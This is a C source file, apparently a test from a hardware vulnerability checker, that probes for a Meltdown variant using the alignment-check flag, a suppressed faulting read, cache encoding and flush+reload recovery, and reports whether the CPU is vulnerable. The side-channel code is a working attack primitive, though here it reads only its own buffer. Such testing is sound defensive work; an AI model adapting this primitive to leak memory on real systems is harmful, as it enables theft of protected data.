#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sched.h>

#include "libcache/cache.h"
#include "lib/global.h"

#if defined(__i386__)
  #define ENABLE_AC 					\
    __asm__("pushf\norl $0x40000,(%esp)\npopf")
  #define DISABLE_AC 					\
    __asm__("pushf\nandl $~(0x40000),(%esp)\npopf")
#else
  #define ENABLE_AC 					\
    __asm__("pushf\norl $0x40000,(%rsp)\npopf")
  #define DISABLE_AC 					\
    __asm__("pushf\nandl $~(0x40000),(%rsp)\npopf")
#endif

int main(int argc, char **argv)
{
    // 准备阶段
    PREPARE();

// exploit gen
#ifdef EXPLOIT_VAR
    char *buffer;
    int *p;
    buffer = (char *)malloc(sizeof(int) + 1);
    buffer++;
    *buffer = rand() % ('~' - ' ' + 1) + ' ';
    // printf("%c\n", *buffer);
    p = (int *)buffer;
#else
    char *buffer;
    int *p;
    buffer = (char *)malloc(sizeof(int) + 1);
    buffer++;
    *buffer = 's';
    p = (int *)buffer;
#endif
    start_time = clock();
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // attack
        flush_shared_memory();
#if defined(__i386__) || defined(__x86_64__)
        ENABLE_AC;
#endif
        if (try_start())
        {
            maccess(0);
            cache_encode(*p);
            try_abort();
        }
        try_end();
#if defined(__i386__) || defined(__x86_64__)
        DISABLE_AC;
#endif
        // flush+reload
        // printf("%c", cache_decode());
        if (cache_decode() == *buffer)
        {
            passed_count++;
        }
        if (clock() - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_AC: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    // printf("%lf\n", (double)passed_count/MAX_TRY_TIMES);
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_AC: Vulnerable" ANSI_COLOR_RESET "\n");
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_AC: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}